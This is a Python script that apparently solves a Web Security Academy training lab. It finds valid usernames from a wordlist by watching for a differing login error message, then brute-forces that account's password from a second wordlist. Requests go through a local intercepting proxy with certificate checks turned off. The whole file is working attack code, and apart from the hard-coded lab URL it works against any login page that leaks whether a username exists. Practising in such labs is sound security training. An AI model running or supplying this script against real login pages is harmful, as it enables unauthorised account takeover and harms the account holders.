import requests
import warnings

warnings.filterwarnings('ignore')
proxyDict = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

url = 'https://ac921f341e8304a2c05b63ef003f0045.web-security-academy.net/'
def bruteForce(user):
    with open('../passwords.txt') as f:
        passwords = f.read().splitlines()
    print (f'Bruteforcing user {user}...')
    for p in passwords:
        formData = 'username='+user+'&password='+p
        response = requests.request('POST', url+'login',
                                    data=formData, proxies=proxyDict, verify=False).content.decode('utf-8')
        if 'Incorrect password' not in response:
            print(f'[+] {user}:{p} [PASSWORD IDENFIED]')
            break

def detectUser():
    with open('../usernames.txt') as f:
        users = f.read().splitlines()
    print ('Enumerating users...')
    for u in users:
        formData = 'username='+u+'&password=abcdfg'
        response = requests.request('POST', url+'login',
                                    data=formData, proxies=proxyDict, verify=False).content.decode('utf-8')
        if 'Invalid username' not in response:
            print (f'[+] User: {u} [VALID]')
            bruteForce(u)
            break

detectUser()
#bruteForce('announce')